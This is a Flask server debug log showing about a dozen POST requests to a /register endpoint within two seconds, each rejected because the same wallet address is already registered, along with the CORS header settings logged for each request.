2025-07-09 10:55:17,482 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:17,604 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:17,604 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:17,604 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:17,604 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:17,605 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:17,609 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:17,610 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:17,610 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:17,610 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:17,610 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:17,749 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:17,749 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:17,749 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:17,749 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:17,749 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:17,753 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:17,753 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:17,753 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:17,753 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:17,754 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:17,893 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:17,893 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:17,893 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:17,893 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:17,894 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:17,898 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:17,898 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:17,898 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:17,898 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:17,898 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:18,164 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:18,164 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:18,164 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:18,164 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:18,165 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:18,170 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:18,171 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:18,171 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:18,171 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:18,171 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:18,323 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:18,324 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:18,324 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:18,324 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:18,324 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:18,329 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:18,329 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:18,330 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:18,330 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:18,330 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:18,452 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:18,452 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:18,452 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:18,453 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:18,453 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:18,458 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:18,458 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:18,458 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:18,458 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:18,459 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:18,612 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:18,613 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:18,613 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:18,613 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:18,613 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:18,617 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:18,617 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:18,618 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:18,618 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:18,618 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:18,744 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:18,744 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:18,745 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:18,745 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:18,745 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:18,750 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:18,750 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:18,750 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:18,750 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:18,751 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:18,884 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:18,885 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:18,885 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:18,885 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:18,885 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:18,889 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:18,889 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:18,890 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:18,890 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:18,890 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:19,028 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:19,029 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:19,029 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:19,029 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:19,029 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:19,036 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:19,036 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:19,036 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:19,036 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:19,036 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:19,188 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:19,188 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:19,188 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:19,188 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:19,188 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:19,192 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:19,192 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:19,192 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:19,192 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:19,193 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:19,413 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:19,413 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:19,413 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:19,413 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:19,413 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:19,418 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
